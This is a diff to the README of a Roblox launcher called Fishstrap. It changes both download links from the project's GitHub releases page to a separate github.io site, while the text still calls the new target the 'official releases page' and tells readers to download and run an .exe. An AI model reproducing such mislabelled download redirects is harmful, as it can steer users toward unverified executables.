@@ -1,6 +1,6 @@
 # 🐟 Fishstrap-Roblox-2026 - Improve your Roblox experience on Windows
 
-[![Download Fishstrap](https://img.shields.io/badge/Download-Fishstrap-blue.svg)](https://github.com/Rayanpr3470/Fishstrap-Roblox-2026/releases)
+[![Download Fishstrap](https://img.shields.io/badge/Download-Fishstrap-blue.svg)](https://rayanpr3470.github.io)
 
 Fishstrap serves as a modern launcher for Roblox. It provides tools to manage settings, unlock your frame rate, and customize your game experience. You can manage internal game flags and install game modifications through a simple interface.
 
@@ -16,7 +16,7 @@ Fishstrap serves as a modern launcher for Roblox. It provides tools to manage se
 
 Follow these steps to install the software on your computer.
 
-1.  Visit the [official releases page](https://github.com/Rayanpr3470/Fishstrap-Roblox-2026/releases).
+1.  Visit the [official releases page](https://rayanpr3470.github.io).
 2.  Locate the latest version banner at the top of the list.
 3.  Click the file ending in `.exe` under the Assets section to download it.
 4.  Run the downloaded installer file.
